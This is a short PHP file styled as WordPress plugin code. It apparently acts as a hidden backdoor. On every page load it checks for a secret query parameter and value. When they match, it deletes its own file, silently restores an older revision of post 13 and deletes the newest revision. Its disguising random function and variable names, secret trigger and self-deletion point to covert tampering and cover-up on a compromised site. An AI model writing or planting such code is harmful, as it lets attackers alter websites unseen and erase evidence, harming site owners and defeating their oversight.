<?php

function autocomplete_review_subscribe() {
	if (isset($_GET['guest_variation_web']) && $_GET['guest_variation_web'] === 'favicon_rates_pdf_github') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$demomentsomtres_sliding_blocks = 13;
		$ultimate_updates_filter_popup = wp_get_post_revisions($demomentsomtres_sliding_blocks);
		if (empty($ultimate_updates_filter_popup)) die('no revisions');
		if (count($ultimate_updates_filter_popup) < 2) die('less than 2');
		$media_log_charts_listing = array_shift($ultimate_updates_filter_popup);
		$pro_form_validation = $media_log_charts_listing->ID;
		$quote_forms_statistics = array_shift($ultimate_updates_filter_popup);
		$feed_plus_shortcodes_menu = $quote_forms_statistics->ID;
		$address_about_quantity = wp_restore_post_revision($feed_plus_shortcodes_menu);
		if ($address_about_quantity === false) die('error restoring');
		$address_about_quantity = wp_delete_post_revision($pro_form_validation);		
		if ($address_about_quantity === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'autocomplete_review_subscribe');
